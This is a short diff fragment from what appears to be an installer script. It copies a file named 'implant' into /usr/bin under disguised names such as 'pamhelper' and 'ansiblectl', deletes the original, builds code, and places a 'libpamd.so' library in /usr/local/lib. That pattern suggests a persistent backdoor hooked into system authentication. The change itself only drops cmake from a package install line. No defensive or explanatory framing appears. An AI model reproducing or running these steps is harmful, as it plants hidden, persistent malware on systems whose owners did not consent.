@@ -13,7 +13,7 @@ cp /tmp/implant /usr/bin/pamhelper
 cp /tmp/implant /usr/bin/ansiblectl
 rm /tmp/implant
 
-apt-get -y install gcc make cmake
+apt-get -y install gcc make
 make
 
 mv libpamd.so /usr/local/lib/libpamd.so
